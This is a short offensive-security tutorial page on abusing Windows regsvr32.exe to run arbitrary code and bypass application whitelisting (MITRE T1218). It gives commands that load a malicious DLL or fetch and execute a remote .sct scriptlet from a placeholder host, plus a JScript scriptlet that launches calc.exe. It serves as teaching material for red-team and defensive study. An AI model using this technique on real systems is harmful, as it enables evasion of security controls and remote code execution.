# RegSrv32

## Theory

Regsvr32 is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs) in the Windows Registry. Besides its intended use, regsvr32.exe binary can also be used to execute arbitrary binaries and bypass the Windows Application Whitelisting.

Application Whitelisting is a Microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time. Application whitelisting is rule-based, where it specifies a list of approved applications or executable files that are allowed to be present and executed on an operating system.

## Practice

{% tabs %}
{% tab title="Regsvr32.exe" %}
```bash
#Execute dll
c:\Windows\System32\regsvr32.exe c:\Users\pwn\Downloads\malicious.dll

#Or
c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\malicious.dll
```

With the .sct file as:

```bash
#http://example.com/file.sct
<?XML version="1.0"?>
<scriptlet>
<registration
  progid="TESTING"
  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
  <script language="JScript">
    <![CDATA[
      var foo = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
    ]]>
</script>
</registration>
</scriptlet>
```

The MITRE ATT\&CK framework refers to this technique as [Signed Binary Proxy Execution (T1218)](https://attack.mitre.org/techniques/T1218/)
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/livingofftheland" %}

{% embed url="https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo" %}
